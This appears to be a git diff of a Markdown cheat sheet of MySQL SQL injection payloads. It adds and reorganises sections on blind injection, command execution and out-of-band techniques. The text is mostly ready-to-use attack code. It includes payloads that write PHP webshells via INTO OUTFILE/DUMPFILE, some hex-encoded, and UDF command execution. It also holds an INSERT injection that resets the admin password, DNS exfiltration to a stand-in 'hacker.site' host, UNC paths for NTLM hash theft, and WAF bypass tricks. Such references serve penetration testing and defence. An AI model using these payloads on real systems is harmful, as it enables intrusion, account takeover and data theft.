@@ -25,23 +25,24 @@
     * [Using SLEEP in a subselect](#using-sleep-in-a-subselect)
     * [Using conditional statements](#using-conditional-statements)
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
-* [MYSQL Current queries](#mysql-current-queries)
-* [MYSQL Read content of a file](#mysql-read-content-of-a-file)
-* [MYSQL Write a shell](#mysql-write-a-shell)
-    * [Into outfile method](#into-outfile-method)
-    * [Into dumpfile method](#into-dumpfile-method)
-* [MYSQL UDF command execution](#mysql-udf-command-execution)
+* [MYSQL Current Queries](#mysql-current-queries)
+* [MYSQL Read Content of a File](#mysql-read-content-of-a-file)
+* [MYSQL Command Execution](#mysql-command-execution)
+    * [WEBSHELL - OUTFILE method](#shell---outfile-method)
+    * [WEBSHELL - DUMPFILE method](#shell---dumpfile-method)
+    * [COMMAND - UDF Library](#udf-library)
+* [MYSQL INSERT](#mysql-insert)
 * [MYSQL Truncation](#mysql-truncation)
-* [MYSQL Fast Exploitation](#mysql-fast-exploitation)
-* [MYSQL Out of band](#mysql-out-of-band)
-    * [DNS exfiltration](#dns-exfiltration)
-    * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
+* [MYSQL json_arrayagg](#mysql-json_arrayagg)
+* [MYSQL Out of Band](#mysql-out-of-band)
+    * [DNS Exfiltration](#dns-exfiltration)
+    * [UNC Path - NTLM Hash Stealing](#unc-path---ntlm-hash-stealing)
 * [MYSQL WAF Bypass](#mysql-waf-bypass)
-    * [Alternative to information schema](#alternative-to-information-schema)
+    * [Alternative to Information Schema](#alternative-to-information-schema)
     * [Alternative to version](#alternative-to-version)
     * [Scientific Notation](#scientific-notation)
     * [Conditional Comments](#conditional-comments)
-    * [Wide byte injection](#wide-byte-injection)
+    * [Wide Byte Injection (GBK)](#wide-byte-injection-gbk)
 * [References](#references)
 
 
@@ -291,14 +292,20 @@ Works with `MySQL >= 5.0`
 
 ### MYSQL Blind with substring equivalent
 
+| Function | Example | Description |
+| --- | --- | --- |
+| `SUBSTR` | `SUBSTR(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
+| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
+| `RIGHT` | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |
+| `MID` | `MID(version(),1,1)=4` | Extracts a substring from a string (starting at any position) |
+| `LEFT` | `LEFT(version(),1)=4` | Extracts a number of characters from a string (starting from left) |
+
+Examples of Blind SQL injection using SUBSTRING or another equivalent function:
+
 ```sql
-?id=1 and substring(version(),1,1)=5
-?id=1 and right(left(version(),1),1)=5
-?id=1 and left(version(),1)=4
-?id=1 and ascii(lower(substr(Version(),1,1)))=51
-?id=1 and (select mid(version(),1,1)=4)
 ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
 ?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
+?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
 ```
 
 ### MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP
@@ -306,23 +313,26 @@ Works with `MySQL >= 5.0`
 This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not.
 For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.
 
-```
+```SQL
 [...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -
 ```
 
 ### MySQL Blind SQL Injection binary query using REGEXP.
 
 Payload:
-```
+
+```sql
 ' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
 ```
 
 Would work in the query (where the "where" clause is the injection point):
-```
+
+```SQL
 SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';
 ```
 
 In said query, it will check to see if an item exists in the "name" column in the "items" database that starts with an "a". If it will sleep for 3 seconds per item.
+
 
 ### MYSQL Blind using a conditional statement
 
@@ -448,7 +458,7 @@ make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(51
 ```
 
 
-## MYSQL Current queries
+## MYSQL Current Queries
 
 This table can list all operations that DB is performing at the moment.
 
@@ -459,7 +469,7 @@ union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
 union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
 ```
 
-## MYSQL Read content of a file
+## MYSQL Read Content of a File
 
 Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`
 
@@ -477,9 +487,9 @@ If you are `root` on the database, you can re-enable the `LOAD_FILE` using the f
 GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
 ```
 
-## MYSQL Write a shell
+## MYSQL Command Execution
 
-### Into outfile method
+### WEBSHELL - OUTFILE Method
 
 ```sql
 [...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
@@ -488,36 +498,14 @@ GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
 [...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
 ```
 
-### Into dumpfile method
+### WEBSHELL - DUMPFILE Method
 
 ```sql
 [...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
 [...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
 ```
 
-## MYSQL Truncation
-
-In MYSQL "`admin `" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
-
-```sql
-`username` varchar(20) not null
-```
-
-Payload: `username = "admin               a"`
-
-## MYSQL Fast Exploitation
-
-Requirement: `MySQL >= 5.7.22`
-
-Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed
-* group_concat() = 1024 symbols
-* json_arrayagg() > 16,000,000 symbols
-
-```sql
-SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
-```
-
-## MYSQL UDF command execution
+### COMMAND - UDF Library
 
 First you need to check if the UDF are installed on the server.
 
@@ -540,21 +528,66 @@ mysql> SELECT sys_eval('id');
 ```
 
 
-## MYSQL Out of band
+## MYSQL INSERT
+
+`ON DUPLICATE KEY UPDATE` keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
+
+Inject using payload:
+
+```sql
+attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
+```
+
+The query would look like this:
+
+```sql
+INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
+```
+
+This query will insert a row for the user "attacker_dummy@example.com". It will also insert a row for the user "admin@example.com".
+
+Because this row already exists, the `ON DUPLICATE KEY UPDATE` keyword tells MySQL to update the `password` column of the already existing row to "P@ssw0rd". After this, we can simply authenticate with "admin@example.com" and the password "P@ssw0rd".
+
+
+## MYSQL Truncation
+
+In MYSQL "`admin `" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
+
+```sql
+`username` varchar(20) not null
+```
+
+Payload: `username = "admin               a"`
+
+
+## MYSQL json_arrayagg
+
+Requirement: `MySQL >= 5.7.22`
+
+Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed
+* group_concat() = 1024 symbols
+* json_arrayagg() > 16,000,000 symbols
+
+```sql
+SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
+```
+
+
+## MYSQL Out of Band
 
 ```powershell
 select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
 select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
 ```
 
-### DNS exfiltration
+### DNS Exfiltration
 
 ```sql
 select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
 select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
 ```
 
-### UNC Path - NTLM hash stealing
+### UNC Path - NTLM Hash Stealing
 
 ```sql
 select load_file('\\\\error\\abc');
@@ -567,7 +600,7 @@ load data infile '\\\\error\\abc' into table database.table_name;
 
 ## MYSQL WAF Bypass
 
-### Alternative to information schema
+### Alternative to Information Schema
 
 `information_schema.tables` alternative
 
@@ -643,7 +676,7 @@ This technique can be used to obfuscate queries to bypass WAF, for example: `1.e
 Examples: `/*!12345UNION*/`, `/*!31337SELECT*/`
 
 
-### Wide byte injection
+### Wide Byte Injection (GBK)
 
 Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term "wide byte" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.
 
